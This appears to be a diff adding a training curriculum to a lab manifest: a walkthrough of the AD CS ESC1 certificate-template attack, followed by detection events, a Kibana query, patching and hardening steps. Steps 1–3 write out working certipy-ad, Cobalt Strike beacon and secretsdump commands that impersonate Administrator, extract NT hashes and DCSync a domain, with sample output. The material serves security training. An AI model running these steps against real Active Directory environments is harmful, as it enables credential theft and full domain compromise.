@@ -220,4 +220,387 @@ cost:
   cpu_pct: 0
   detectability: quiet
 
+curriculum:
+  title: "ADCS ESC1 — enrollee-supplied subject to domain admin via PKINIT"
+  summary: >
+    Walkthrough of Certified Pre-Owned ESC1 against the test lab CA
+    (running on `tldc01`, 10.99.50.10). You will enumerate certificate
+    templates with Certipy, identify the `ESC1-Vulnerable` template,
+    request a certificate as `TESTLAB\Administrator` (using an
+    enrollee-supplied UPN), PKINIT-authenticate with that certificate
+    to retrieve Administrator's NT hash, and DCSync the domain.
+  learning_objectives:
+    - "Explain why ENROLLEE_SUPPLIES_SUBJECT on a Client Auth template equals domain takeover."
+    - "Enumerate certificate templates with the modern `certipy-ad` CLI (NOT the deprecated old `certipy` fork)."
+    - "Request a certificate impersonating Administrator and use PKINIT to extract their NT hash."
+    - "Identify the AD CS audit events (4886/4887) and explain why coverage is thin."
+  prerequisites:
+    - "Low-privilege TESTLAB credentials (e.g., `TESTLAB\\j.doe:Welcome1!`)"
+    - "certipy-ad >= 5.0 on Kali — `pipx install certipy-ad` (NOT the old archived `certipy` package)"
+    - "Impacket >= 0.11 on Kali"
+    - "Network reach from Kali (192.168.1.100) to tldc01 (10.99.50.10) on 88 (Kerberos), 135+dynamic (RPC), 445 (SMB), 80 (HTTP enrollment)"
+    - "An active Cobalt Strike beacon on tlws01 (10.99.50.12) as TESTLAB\\j.doe — required for the Certify.exe / BOF alternative paths"
+    - "Certify.exe binary from GhostPack — https://github.com/GhostPack/Certify (build from source)"
+  estimated_total_minutes: 40
+  steps:
+    - id: "01-enumerate-templates"
+      title: "Find vulnerable templates with Certipy"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 1 — Inventory the CA + templates
+
+        `certipy-ad` is the canonical modern Linux-side AD CS tool
+        (Outflanknl's fork went archived in 2023; the active fork is at
+        https://github.com/ly4k/Certipy). It enumerates templates,
+        identifies misconfigurations, and chains exploitation in one
+        binary.
+
+        ```bash
+        # From Kali — enumerate the CA + templates
+        certipy-ad find \
+            -u 'j.doe@testlab.local' -p 'Welcome1!' \
+            -dc-ip 10.99.50.10 \
+            -stdout -vulnerable
+        ```
+
+        Expected output (truncated to the relevant template):
+
+        ```
+        Certificate Authorities
+          0
+            CA Name                             : testlab-TLDC01-CA
+            DNS Name                            : tldc01.testlab.local
+            Certificate Subject                 : CN=testlab-TLDC01-CA, DC=testlab, DC=local
+            Web Enrollment                      : Enabled
+            User Specified SAN                  : Disabled
+            Request Disposition                 : Issue
+
+        Certificate Templates
+          0
+            Template Name                       : ESC1-Vulnerable
+            Display Name                        : ESC1-Vulnerable
+            Certificate Authorities             : testlab-TLDC01-CA
+            Enabled                             : True
+            Client Authentication               : True
+            Enrollment Agent                    : False
+            Any Purpose                         : False
+            Enrollee Supplies Subject           : True            <-- ESC1 flag
+            Certificate Name Flag               : EnrolleeSuppliesSubject
+            Enrollment Flag                     : None
+            Extended Key Usage                  : Client Authentication
+            Requires Manager Approval           : False
+            Requires Key Archival               : False
+            Authorized Signatures Required      : 0
+            Permissions
+              Enrollment Permissions
+                Enrollment Rights               : TESTLAB.LOCAL\Domain Users
+              Object Control Permissions
+                Owner                           : TESTLAB.LOCAL\Domain Admins
+            [!] Vulnerabilities
+              ESC1                              : 'TESTLAB.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
+        ```
+
+        Three flags in combination make this ESC1:
+        - **Enrollee Supplies Subject = True** → caller picks the
+          certificate subject (UPN / DNS name)
+        - **Client Authentication EKU** → cert usable for PKINIT
+        - **Domain Users can enroll** → any user can request it
+
+        **Alternative — Certify.exe from beacon on tlws01**:
+
+        ```
+        beacon> execute-assembly /opt/Certify/Certify.exe find /vulnerable
+        ```
+
+        Certify is the GhostPack Windows-side equivalent (C#).
+
+        > **Elastic rule that fires**: none yet for AD CS template
+        > enumeration — coverage is `no-rule` per this bolt-on's
+        > manifest. The closest signal is Sysmon Event 1 / Event 4688
+        > for `certipy-ad` or `Certify.exe` execution, which fires on
+        > tlws01 (the enrollment host) but not on the CA itself.
+      assessment:
+        question: "Which three conditions, in combination, make a certificate template ESC1-vulnerable?"
+        options:
+          - "AnyPurpose EKU + Manager Approval = False + Web Enrollment enabled"
+          - "Enrollee Supplies Subject + Client Authentication EKU + Low-privilege principals can enroll"
+          - "Enrollment Agent EKU + Authorized Signatures = 0 + Domain Computers can enroll"
+          - "EnrolleeFlagsIncludeName + Server Authentication EKU + Authenticated Users can enroll"
+        correct_index: 1
+        explanation: >
+          ESC1 = Enrollee Supplies Subject + Client Authentication
+          (or AnyPurpose / SmartCard Logon / PKINIT Client Auth) +
+          low-privilege enroll rights. AnyPurpose is the ESC2 variant.
+          Enrollment Agent + signature count is ESC3. Server
+          Authentication alone is not enough — it cannot PKINIT.
+    - id: "02-request-admin-cert"
+      title: "Request a cert as Administrator (the impersonation)"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 2 — Issue a cert impersonating Administrator
+
+        The Enrollee Supplies Subject flag means certipy can stuff
+        `administrator@testlab.local` into the certificate's
+        subjectAltName UPN field. The CA blindly signs it. The cert is
+        now valid for PKINIT as Administrator.
+
+        ```bash
+        # From Kali
+        certipy-ad req \
+            -u 'j.doe@testlab.local' -p 'Welcome1!' \
+            -dc-ip 10.99.50.10 \
+            -target tldc01.testlab.local \
+            -ca 'testlab-TLDC01-CA' \
+            -template 'ESC1-Vulnerable' \
+            -upn 'administrator@testlab.local' \
+            -out /tmp/admin
+        ```
+
+        Expected output:
+
+        ```
+        Certipy v5.0.0 - by Oliver Lyak (ly4k)
+
+        [*] Requesting certificate via RPC
+        [*] Successfully requested certificate
+        [*] Request ID is 12
+        [*] Got certificate with UPN 'administrator@testlab.local'
+        [*] Certificate object SID is 'S-1-5-21-...-500'
+        [*] Saved certificate and private key to '/tmp/admin.pfx'
+        ```
+
+        Two artefacts:
+        - `/tmp/admin.pfx` — the certificate + private key bundle
+        - `Request ID 12` — referenceable in CA Manager → Issued
+          Certificates (an audit trail the CA admin can see, but only
+          if they look)
+
+        **Alternative — Certify.exe from beacon**:
+
+        ```
+        beacon> execute-assembly /opt/Certify/Certify.exe request /ca:tldc01.testlab.local\testlab-TLDC01-CA /template:ESC1-Vulnerable /altname:administrator
+        ```
+
+        Certify prints the cert + key to the beacon console; assemble
+        them into a `.pfx` locally with `openssl pkcs12 -export`.
+
+        **BOF alternative**: Outflank's `C2-Tool-Collection` has an
+        `ADCS_Enum` BOF but not a request BOF; for OPSEC-quiet
+        operation prefer Certify via `execute-assembly` over a fresh
+        process.
+
+        > **Elastic rule that fires**: Windows Event 4886 (CA received
+        > a request) + 4887 (CA approved a request) fire on the CA
+        > itself. No Elastic-prebuilt rule maps to ESC1 specifically;
+        > the bolt-on's fallback template
+        > (`webapp/bolton/rule_templates/adcs-template-enroll.j2.yml`)
+        > correlates 4887 + a Subject:UPN that does not match the
+        > requesting user.
+      assessment:
+        question: "Why doesn't the CA reject the enrollment when `j.doe` requests a certificate with `administrator@testlab.local` as the UPN?"
+        options:
+          - "The CA trusts whatever subject the enrollee supplies because the ENROLLEE_SUPPLIES_SUBJECT flag on the template explicitly grants that capability — there is no further authorisation check."
+          - "The CA only checks the requesting user's SID against an allowlist."
+          - "j.doe has the SeManageVolumePrivilege on the CA host."
+          - "The CA validates the UPN against AD; the lab's AD is misconfigured."
+        correct_index: 0
+        explanation: >
+          The ENROLLEE_SUPPLIES_SUBJECT flag is precisely the "let the
+          requester pick the subject" toggle. There is no second
+          authorisation check that asks "is j.doe allowed to request a
+          cert FOR administrator?" — the template author is expected
+          to scope enrollment rights tightly enough that this can't be
+          abused. When Domain Users can enroll AND enrollee supplies
+          subject AND the EKU is Client Auth, you have a
+          domain-takeover primitive.
+    - id: "03-pkinit-and-dcsync"
+      title: "PKINIT with the cert and DCSync"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 3 — Authenticate as Administrator via PKINIT, then DCSync
+
+        Certipy chains PKINIT and hash extraction in one command via
+        the `auth` subcommand. The cert authenticates as the UPN it
+        carries (`administrator@testlab.local`); the KDC returns a TGT
+        AND the NT hash via the PAC.
+
+        ```bash
+        # From Kali
+        certipy-ad auth -pfx /tmp/admin.pfx -dc-ip 10.99.50.10
+        ```
+
+        Expected:
+
+        ```
+        Certipy v5.0.0 - by Oliver Lyak (ly4k)
+
+        [*] Using principal: administrator@testlab.local
+        [*] Trying to get TGT...
+        [*] Got TGT
+        [*] Saved credential cache to 'administrator.ccache'
+        [*] Trying to retrieve NT hash for 'administrator'
+        [*] Got hash for 'administrator@testlab.local': aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
+        ```
+
+        Two artefacts:
+        - `administrator.ccache` — Kerberos credential cache for
+          subsequent pass-the-ticket
+        - The NT hash — straight pass-the-hash payload
+
+        DCSync to confirm full domain compromise:
+
+        ```bash
+        secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \
+            -just-dc TESTLAB.LOCAL/administrator@10.99.50.10
+        ```
+
+        Expected (truncated):
+
+        ```
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3bc61e97fb14d18c42bcbf6c3a9055f:::
+        TESTLAB\ansible:1108:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+        ```
+
+        Domain owned. From here you can:
+        - Mint a Golden Ticket with the krbtgt hash
+        - Pass-the-hash to any TESTLAB endpoint
+        - Persist via DCShadow / SID History
+
+        > **Elastic rule that fires**: `Potential Credential Access via
+        > DCSync` fires on the DRSUAPI replication call from a
+        > non-DC source. The PKINIT itself fires Event 4768 with
+        > `PreAuthType=16` (PKINIT) — a useful filter for "who
+        > authenticated via certificate".
+    - id: "04-detection-mapping"
+      title: "Detection coverage and hand-rolled rules"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 4 — Detection coverage
+
+        This bolt-on ships `coverage_status: no-rule` — Elastic has no
+        prebuilt rule that fires on ESC1 template misconfiguration.
+        Defenders must hand-roll detection.
+
+        ### Raw EVTX events to pivot on
+
+        | Event | Source | What it tells you |
+        |---|---|---|
+        | **4886** | CA host (tldc01) | CA received a certificate request — `Subject` + `Requester` fields |
+        | **4887** | CA host (tldc01) | CA approved a request — the smoking gun is `Requester != Subject UPN` |
+        | 5136 | DC | Directory Service modification of `pKICertificateTemplate` (catches the install side of this bolt-on) |
+        | 4768 | DC | TGT issued — filter on `PreAuthType=16` (PKINIT) to find cert-based logons |
+
+        ### Highest-fidelity Kibana DSL
+
+        ```
+        event.code:4887 AND
+        winlog.event_data.RequesterUser:"TESTLAB\\j.doe" AND
+        NOT winlog.event_data.SubjectAltNamesUPN:"j.doe@testlab.local"
+        ```
+
+        That fires when `j.doe` requests a cert whose UPN does not
+        match `j.doe@testlab.local` — the impersonation signal.
+
+        ### Template-audit pre-emptive query
+
+        Run quarterly against the CA's template store:
+
+        ```powershell
+        # On the CA host
+        Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" `
+          -Filter * -Properties msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag, pKIExtendedKeyUsage |
+          Where-Object {
+            ($_.'msPKI-Certificate-Name-Flag' -band 0x1) -eq 0x1 -and
+            ($_.pKIExtendedKeyUsage -contains '1.3.6.1.5.5.7.3.2')  # Client Auth
+          } |
+          Select-Object Name, msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag
+        ```
+
+        Any non-empty result is a finding — every result is a
+        potentially ESC1-vulnerable template. Pair with an enrollment
+        ACL check to confirm whether low-privilege users can enroll.
+
+        > **Elastic rule that fires**: none directly. The fallback
+        > template at `webapp/bolton/rule_templates/adcs-template-enroll.j2.yml`
+        > materialises the 4887+UPN-mismatch correlation as a custom
+        > Elastic rule (Phase 4 work).
+      assessment:
+        question: "On the CA host, you see Event 4887 where `Requester=TESTLAB\\j.doe` and the issued cert has `Subject Alt Name UPN = administrator@testlab.local`. What does this mean?"
+        options:
+          - "j.doe legitimately requested a cert on behalf of Administrator using the Enrollment Agent template."
+          - "j.doe just used an ESC1 template to request a certificate impersonating Administrator — this is exploitation, not a misconfig."
+          - "The CA log is corrupt."
+          - "The CA auto-renewed Administrator's cert and j.doe is the configured service account."
+        correct_index: 1
+        explanation: >
+          A Requester != Subject mismatch is the canonical exploitation
+          signal for ESC1 (or ESC6 with EDITF_ATTRIBUTESUBJECTALTNAME2).
+          The Enrollment Agent template (ESC3 territory) would show in
+          a different field — `AuthorizedSignatures` and a chain of
+          two requests. The Subject-UPN mismatch on a single request is
+          ESC1's smoking gun.
+    - id: "05-patch-and-harden"
+      title: "Patch the template + AD CS hardening checklist"
+      estimated_minutes: 9
+      markdown: |
+        ## Step 5 — Patch + harden the lab CA
+
+        Click **Patch** on this card. The bolt-on's patch block:
+
+        1. Clears `msPKI-Certificate-Name-Flag` bit 0x1
+           (ENROLLEE_SUPPLIES_SUBJECT) on the `ESC1-Vulnerable` template.
+        2. Sets `msPKI-Enrollment-Flag` bit 0x2 (PEND_ALL_REQUESTS —
+           Manager Approval required for every request).
+
+        Re-run step 2's certipy request — it now returns:
+
+        ```
+        [-] Got error while requesting certificate: code: 0x80094800 - CERTSRV_E_TEMPLATE_DENIED
+        ```
+
+        — the request is queued pending CA Manager approval, AND the
+        Subject-supplied UPN is rejected at template-load time.
+
+        > **Existing certificates already issued** remain valid until
+        > expiry — this is the gotcha. To fully remediate, you must
+        > revoke every cert issued from the template before the patch:
+        > ```powershell
+        > # On the CA host
+        > certutil -view -restrict "CertificateTemplate=ESC1-Vulnerable" -out "RequestId" |
+        >   ForEach-Object { certutil -revoke $_ 4 }  # reason 4 = Superseded
+        > certutil -CRL  # publish updated CRL
+        > ```
+
+        ### AD CS hardening checklist (Certified Pre-Owned remediation)
+
+        | Control | Why |
+        |---|---|
+        | **Quarterly template audit** (script in step 4) | Detects new ESC1 misconfigs |
+        | **Disable web enrollment** on the CA | Removes the ESC8 NTLM-relay-to-CA primitive entirely |
+        | **Set `EDITF_ATTRIBUTESUBJECTALTNAME2 = 0`** on every CA | Prevents ESC6 — global "enrollee supplies SAN" override |
+        | **Add Enterprise CAs to Tier-0** | Restrict management to a small group of DA-equivalent admins |
+        | **Enable CA audit policy** (`Object Access > Certification Services`) | Generates Events 4886/4887 reliably |
+        | **Set `Strong Certificate Mapping` enforcement** | Per KB5014754 — requires SID extension OID in cert, blocks SAN-only impersonation |
+        | **Use Manager Approval (PEND_ALL_REQUESTS) on every Client Auth template** | Catches operator review even if a template is misconfigured |
+
+        Verify hardening:
+
+        ```bash
+        # From Kali — exploit probe should fail
+        ./webapp/bolton/exploit_probes/adcs_esc1_certipy_check.sh \
+            ESC1-Vulnerable testlab-TLDC01-CA tldc01.testlab.local
+        # Expected: exit code 1 — Certipy request denied
+        ```
+
+        > **Rollback**: the manifest declares `patch_revert` — clicking
+        > Revert re-sets ENROLLEE_SUPPLIES_SUBJECT and clears the
+        > Manager Approval gate. Lab is re-armed.
+
+        > **Elastic rule that fires (mitigation phase)**: Windows
+        > Event 5136 fires on the `msPKI-Certificate-Name-Flag` /
+        > `msPKI-Enrollment-Flag` writes performed by the patch — this
+        > is the same signal that would catch a malicious template
+        > modification, so pair with change control.
+
 status: stable
